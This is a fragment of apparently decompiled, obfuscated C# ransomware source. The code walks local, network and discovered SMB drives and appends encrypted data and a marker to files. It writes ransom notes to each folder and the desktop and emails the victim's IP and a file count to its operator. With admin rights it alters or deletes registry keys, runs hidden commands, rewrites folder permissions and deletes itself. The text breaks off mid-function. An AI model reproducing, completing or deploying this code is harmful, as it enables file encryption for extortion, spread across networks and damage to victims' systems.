				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394013), getString_0(107391307) + OpvlVUeWPNde);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in MoDypcoPNXgE)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107394013)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394013), item + getString_0(107394013), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394013));
					if (!text12.Contains(OpvlVUeWPNde) && !intMyWSRTiS)
					{
						File.AppendAllText(item + getString_0(107394013), getString_0(107391307) + OpvlVUeWPNde);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!qBctdZYmhWs && num > 10)
			{
				break;
			}
		}
		if (coTyYysvNimxzp == getString_0(107396935))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391278)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391278));
					streamWriter2.WriteLine(dOioDTBjWKE(getString_0(107391221)));
					streamWriter2.WriteLine(getString_0(107396702));
					streamWriter2.WriteLine(dOioDTBjWKE(getString_0(107391236)));
					streamWriter2.WriteLine(OpvlVUeWPNde + dOioDTBjWKE(getString_0(107391147)));
					if (XedFtYAsIv == getString_0(107397192))
					{
						streamWriter2.WriteLine(getString_0(107396702));
						streamWriter2.WriteLine(dOioDTBjWKE(getString_0(107391102)) + dOioDTBjWKE(getString_0(107391897)) + Convert.ToString(eSzXPgKVtFvzPRkO.Count) + dOioDTBjWKE(getString_0(107391147)));
					}
					if (pkQDLnznjdsc)
					{
						streamWriter2.WriteLine(getString_0(107396702));
						streamWriter2.WriteLine(dOioDTBjWKE(getString_0(107391340)));
						streamWriter2.WriteLine(OTEZtdtAZBqJ.wvJsjjHPPBP());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394013));
					if (!text13.Contains(OpvlVUeWPNde) && !intMyWSRTiS)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391278), dOioDTBjWKE(getString_0(107391102)) + getString_0(107391307) + OpvlVUeWPNde + dOioDTBjWKE(getString_0(107391147)));
					}
				}
			}
			catch
			{
			}
		}
		if (NlflDRvxbUWSt == getString_0(107396935))
		{
			try
			{
				if (XedFtYAsIv == getString_0(107397192))
				{
					OTEZtdtAZBqJ.UdMtkMlrAUaE(getString_0(107391553), getString_0(107391548), getString_0(107391567), string.Concat(dOioDTBjWKE(getString_0(107396256)), new WebClient().DownloadString(dOioDTBjWKE(getString_0(107396263))), getString_0(107391558), dOioDTBjWKE(getString_0(107396697)), DateTime.Now, getString_0(107396702), dOioDTBjWKE(getString_0(107391521)), Convert.ToString(eSzXPgKVtFvzPRkO.Count), getString_0(107396702), dOioDTBjWKE(getString_0(107396688)), OpvlVUeWPNde));
				}
				else
				{
					OTEZtdtAZBqJ.UdMtkMlrAUaE(getString_0(107391553), getString_0(107391548), getString_0(107391567), string.Concat(dOioDTBjWKE(getString_0(107396256)), new WebClient().DownloadString(dOioDTBjWKE(getString_0(107396263))), getString_0(107391558), dOioDTBjWKE(getString_0(107396697)), DateTime.Now, getString_0(107396702), dOioDTBjWKE(getString_0(107391521)), Convert.ToString(eSzXPgKVtFvzPRkO.Count), getString_0(107396702), dOioDTBjWKE(getString_0(107396688)), OpvlVUeWPNde));
				}
			}
			catch
			{
			}
		}
		if (jsoiRzVmarLdbDEq == getString_0(107396935))
		{
			try
			{
				XJjgmStquN.xLrjGZwFIXCcxE(new Uri(getString_0(107391504)));
			}
			catch
			{
			}
		}
		if (coTyYysvNimxzp == getString_0(107397192))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394013)))
				{
					Process.Start(dOioDTBjWKE(getString_0(107391503)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394013));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391278)))
				{
					Process.Start(dOioDTBjWKE(getString_0(107391446)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391278));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(UObhemfryie))
		{
			try
			{
				File.Delete(UObhemfryie);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396788))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396788)));
			}
		}
		catch (Exception ex18)
		{
			try
			{
				File.AppendAllText(AIOBtLgIwjoLs, getString_0(107391461) + ex18.Message);
			}
			catch (Exception)
			{
			}
		}
		if (JkprrzFPchvjDH)
		{
			try
			{
				File.AppendAllText(AIOBtLgIwjoLs, getString_0(107391384));
			}
			catch (Exception)
			{
			}
		}
		if (GJaEJRItHBd == getString_0(107391403))
		{
			XbTVyboAGqHQlSpf();
		}
	}

	public static void RhnmNEJZkTvAy()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(dOioDTBjWKE(getString_0(107391362)), dOioDTBjWKE(getString_0(107390728)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NADidBdwdjtek(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> ZxSgomMsDMH(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107390699)) && !text.Contains(getString_0(107390674)) && !text.Contains(getString_0(107390641)) && !text.ToLower().Contains(getString_0(107390592)) && !text.ToLower().Contains(getString_0(107390611)) && !text.Contains(getString_0(107391066)) && !text.Contains(getString_0(107391077)) && !text.ToLower().Contains(getString_0(107391032)) && !text.ToLower().Contains(getString_0(107391051)) && !text.ToLower().Contains(getString_0(107391014)) && !text.ToLower().Contains(getString_0(107390973)) && !text.ToLower().Contains(getString_0(107390988)) && !text.ToLower().Contains(getString_0(107390943)) && !text.ToLower().Contains(getString_0(107390962)) && !text.ToLower().Contains(getString_0(107390909)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107390916)) && !fileInfo.FullName.Contains(getString_0(107390899)) && !fileInfo.FullName.Contains(getString_0(107390850)) && !fileInfo.FullName.Contains(getString_0(107390865)) && !fileInfo.FullName.Contains(getString_0(107390304)) && !fileInfo.FullName.Contains(getString_0(107390319)) && !fileInfo.FullName.Contains(getString_0(107390270)) && !fileInfo.FullName.Contains(getString_0(107390285)) && !fileInfo.FullName.Contains(getString_0(107390240)) && !fileInfo.FullName.Contains(getString_0(107390251)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390206)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390225)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390176)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390191)) && !fileInfo.FullName.Contains(dOioDTBjWKE(getString_0(107390142))) && !fileInfo.FullName.Contains(getString_0(107390149)) && !fileInfo.FullName.Contains(getString_0(107396788)) && !fileInfo.FullName.Contains(getString_0(107390104)) && !fileInfo.FullName.EndsWith(getString_0(107394075)) && !fileInfo.FullName.EndsWith(getString_0(107395083)) && !fileInfo.FullName.EndsWith(getString_0(107390119)) && !fileInfo.FullName.EndsWith(getString_0(107395078)) && !fileInfo.FullName.EndsWith(getString_0(107390082)) && !fileInfo.FullName.Contains(getString_0(107390077)) && !fileInfo.FullName.Contains(GlAFQHcfgEJyh) && !fileInfo.FullName.Contains(AIOBtLgIwjoLs) && !fileInfo.FullName.Contains(eZSiHLWxxOCmd))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(ZnQTsnSydQf) * 1024.0 * 1024.0 && ZkQXlCKgLq == getString_0(107396935))
						{
							list.Add(fileInfo.FullName);
							qSfJOKtiXJPB(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && ZkQXlCKgLq == getString_0(107397192))
						{
							list.Add(fileInfo.FullName);
							qSfJOKtiXJPB(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void pYwUBHSIbCFztxeI()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107390092));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!SCtDlgPmJoxb.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390519), getString_0(107396793)).Replace(getString_0(107390546), getString_0(107390519))
					.Replace(getString_0(107390537), getString_0(107391504))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					SCtDlgPmJoxb.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390519), getString_0(107396793)).Replace(getString_0(107390546), getString_0(107390519))
						.Replace(getString_0(107390537), getString_0(107391504))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107390532), getString_0(107391504)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string OrQEYkCSRFdRrs(string BqyJYauaEPOedbnR = "", string euJrAOqrRGY = "")
	{
		string result = getString_0(107391504);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = BqyJYauaEPOedbnR,
				Arguments = euJrAOqrRGY,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void dVUyxumSlHQj(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107390491),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string UdtaLpzykJtzJp(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string dOioDTBjWKE(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void zRNcVXsdYsOXN()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		PoNXeuyYdGzO();
		List<ETzoZnWoESXr> list = ETzoZnWoESXr.WvvfDObunQyf();
		foreach (ETzoZnWoESXr item in list)
		{
			JwVsMsMusHaN.Add(item.IPAddress);
		}
		List<string> jwVsMsMusHaN = JwVsMsMusHaN;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
			{
				MIqpuJIkrjBMR CS_0024_003C_003E8__locals0 = new MIqpuJIkrjBMR();
				CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI = string_0;
				if ((!CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI.StartsWith(getString_0(107387626)) && !CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI.StartsWith(getString_0(107387621)) && !CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI.StartsWith(getString_0(107387580)) && !CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI.StartsWith(getString_0(107391504))) || !MCBYlisTSRSS.twkNavOPtUd(CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI))
				{
					return;
				}
				try
				{
					Thread.Sleep(uZwmuWmXUPb);
					SCtDlgPmJoxb.Add(getString_0(107390519) + CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI + getString_0(107387599));
					try
					{
						if (COsiatrWvUa)
						{
							Console.WriteLine(getString_0(107390519) + CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI + getString_0(107387599));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(uZwmuWmXUPb);
						SCtDlgPmJoxb.Add(MIqpuJIkrjBMR.getString_0(107390525) + CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI + MIqpuJIkrjBMR.getString_0(107396799) + (char)int_0 + MIqpuJIkrjBMR.getString_0(107405055));
						try
						{
							if (COsiatrWvUa)
							{
								Console.WriteLine(MIqpuJIkrjBMR.getString_0(107390525) + CS_0024_003C_003E8__locals0.IKmcGKVfsAkoFI + MIqpuJIkrjBMR.getString_0(107396799) + (char)int_0 + MIqpuJIkrjBMR.getString_0(107405055));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(jwVsMsMusHaN, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
		try
		{
			MCBYlisTSRSS.vDDICYyPDWF vDDICYyPDWF = new MCBYlisTSRSS.vDDICYyPDWF(MCBYlisTSRSS.AgOXWxwxScaWwF.ykojVxHVPyrk, MCBYlisTSRSS.pbjkPSdIGJOv.ffVnZCfVabSQp, MCBYlisTSRSS.PMzRwQUMKQSqR.GkuuTflZPgw, MCBYlisTSRSS.BBNJPuwvZbXZAv.zYWIHIizjdQ);
			foreach (string item2 in vDDICYyPDWF)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107390506));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!SCtDlgPmJoxb.Contains(item3.ToString()))
						{
							SCtDlgPmJoxb.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (COsiatrWvUa)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		fHaTkPBbBXJG.rJgGHLLcLwlpT();
		try
		{
			if (COsiatrWvUa)
			{
				Console.WriteLine(getString_0(107390393));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = UdtaLpzykJtzJp(getString_0(107390384));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(dOioDTBjWKE(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(dOioDTBjWKE(getString_0(107389767)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(dOioDTBjWKE(getString_0(107389710)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (vtcLgmPLsMgV == getString_0(107396935))
		{
			TJIsUoXYwUTtkR.VSXOfkodFLU();
		}
		try
		{
			if (COsiatrWvUa)
			{
				Console.WriteLine(getString_0(107389633));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107390092));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (SCtDlgPmJoxb.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390519), getString_0(107396793)).Replace(getString_0(107390546), getString_0(107390519))
					.Replace(getString_0(107390537), getString_0(107391504))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (COsiatrWvUa)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390519), getString_0(107396793)).Replace(getString_0(107390546), getString_0(107390519))
							.Replace(getString_0(107390537), getString_0(107391504))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107390532), getString_0(107391504)));
					}
				}
				catch
				{
				}
				SCtDlgPmJoxb.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390519), getString_0(107396793)).Replace(getString_0(107390546), getString_0(107390519))
					.Replace(getString_0(107390537), getString_0(107391504))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107390532), getString_0(107391504)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (COsiatrWvUa)
			{
				Console.WriteLine(getString_0(107389608));
			}
		}
		catch
		{
		}
	}

	public static void rwWAvGEeNhr(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = dOioDTBjWKE(getString_0(107390019));
		processStartInfo.Arguments = getString_0(107390022) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool CBQRiXwqhEScXz(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void UcTtzUrPage()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = UdtaLpzykJtzJp(getString_0(107389985));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(dOioDTBjWKE(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107389847)));
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107389822)));
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107389837)));
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107389268)));
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107390019)));
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107389243)));
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107389214)));
					registryKey.Close();
				}
				string_ = UdtaLpzykJtzJp(getString_0(107389229));
				registryKey = Registry.LocalMachine.OpenSubKey(dOioDTBjWKE(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107389132)));
					registryKey.Close();
				}
				string_ = UdtaLpzykJtzJp(getString_0(107389083));
				registryKey = Registry.LocalMachine.OpenSubKey(dOioDTBjWKE(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107389132)));
					registryKey.Close();
				}
				string_ = UdtaLpzykJtzJp(getString_0(107389083));
				registryKey = Registry.CurrentUser.OpenSubKey(dOioDTBjWKE(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(dOioDTBjWKE(getString_0(107389132)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107389098)), dOioDTBjWKE(getString_0(107389049)));
			OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107389544)), dOioDTBjWKE(UdtaLpzykJtzJp(getString_0(107389503))));
			OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107389544)), dOioDTBjWKE(getString_0(107389389)));
			OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107389328)), dOioDTBjWKE(getString_0(107388767)));
		}
		catch
		{
		}
	}

	public static void JrgWtVXefnyJtd(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(dOioDTBjWKE(getString_0(107388694)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void mZBrMdsTqqBMGCly()
	{
		string string_ = UdtaLpzykJtzJp(getString_0(107388669));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(dOioDTBjWKE(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(dOioDTBjWKE(getString_0(107388620)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void PoNXeuyYdGzO()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107388587)), dOioDTBjWKE(getString_0(107388542)));
			OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107388587)), dOioDTBjWKE(getString_0(107388924)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string VuFhdSeMsmJET(string yxHuwVGpKFUd, int sMvqXQdXlHfFUCOu = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(sMvqXQdXlHfFUCOu);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(yxHuwVGpKFUd, 1, intPtr, ref sMvqXQdXlHfFUCOu) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void XbTVyboAGqHQlSpf()
	{
		OrQEYkCSRFdRrs(getString_0(107396441), dOioDTBjWKE(getString_0(107388810)));
		string text = dOioDTBjWKE(getString_0(107388104));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107390537) + text + getString_0(107390537) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396441);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void WlGzlJNuBzaw(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (JkprrzFPchvjDH)
			{
				try
				{
					File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388039) + string_0 + getString_0(107388510) + ex.Message + getString_0(107396702));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string XOkMXYHVKKZne()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107391504);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107388453);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107388444))) ? getString_0(107388458) : getString_0(107388467));
				break;
			case 0:
				text = getString_0(107388449);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107388416);
				break;
			case 4:
				text = getString_0(107388435);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107388385) : getString_0(107388426));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107388393) : getString_0(107388398)) : getString_0(107388403)) : getString_0(107388380));
				break;
			case 10:
				text = getString_0(107388388);
				break;
			}
		}
		if (text != getString_0(107391504))
		{
			text = getString_0(107388351) + text;
			if (oSVersion.ServicePack != getString_0(107391504))
			{
				text = text + getString_0(107388370) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string GIJmxTtMyJmaSPq(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107394013);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(dOioDTBjWKE(getString_0(107394020)));
				streamWriter.WriteLine(getString_0(107396702));
				streamWriter.WriteLine(dOioDTBjWKE(getString_0(107391930)));
				streamWriter.WriteLine(string_0);
				if (pkQDLnznjdsc)
				{
					streamWriter.WriteLine(getString_0(107396702));
					streamWriter.WriteLine(dOioDTBjWKE(getString_0(107391340)));
					streamWriter.WriteLine(OTEZtdtAZBqJ.wvJsjjHPPBP());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !intMyWSRTiS)
				{
					File.AppendAllText(text, getString_0(107391307) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (JkprrzFPchvjDH)
			{
				try
				{
					File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388365) + ex.Message + getString_0(107396702));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void ilNNSiSXIXwhU(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		qZvJdNwKrAHeP.fAYnNuenDMnuFBv CS_0024_003C_003E8__locals0 = new qZvJdNwKrAHeP();
		CS_0024_003C_003E8__locals0.PvihqEsdNvpBrf = string_1;
		CS_0024_003C_003E8__locals0.VokRtgjrfwZGT = string_2;
		CS_0024_003C_003E8__locals0.togHzByXlVeVj = string_3;
		CS_0024_003C_003E8__locals0.EvSRjoDRbsbERQal = string_4;
		ignBTzWcyfBJ = Convert.FromBase64String(CS_0024_003C_003E8__locals0.togHzByXlVeVj);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395926))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = VuFhdSeMsmJET(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !SCtDlgPmJoxb.Contains(text))
							{
								SCtDlgPmJoxb.Add(text);
							}
							else if (!SCtDlgPmJoxb.Contains(array[i].Name))
							{
								SCtDlgPmJoxb.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!SCtDlgPmJoxb.Contains(array[i].Name))
							{
								SCtDlgPmJoxb.Add(array[i].Name);
							}
						}
					}
					else if (!SCtDlgPmJoxb.Contains(array[i].Name))
					{
						SCtDlgPmJoxb.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!SCtDlgPmJoxb.Contains(string_0[j]))
				{
					SCtDlgPmJoxb.Add(string_0[j]);
				}
			}
		}
		if (SCtDlgPmJoxb.Contains(dOioDTBjWKE(getString_0(107388276))) && IbBwmvICpJQnE == getString_0(107396935))
		{
			SCtDlgPmJoxb.Remove(dOioDTBjWKE(getString_0(107388276)));
		}
		Parallel.ForEach(SCtDlgPmJoxb, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new qZvJdNwKrAHeP.fAYnNuenDMnuFBv();
			CS_0024_003C_003E8__locals0.KTVVpMilaQ = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.AVXbhEVgDtzcsv = string_0;
			if (vIHVrrLyyUkl && !XOkMXYHVKKZne().Contains(qZvJdNwKrAHeP.getString_0(107388396)) && !XOkMXYHVKKZne().Contains(qZvJdNwKrAHeP.getString_0(107405055)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
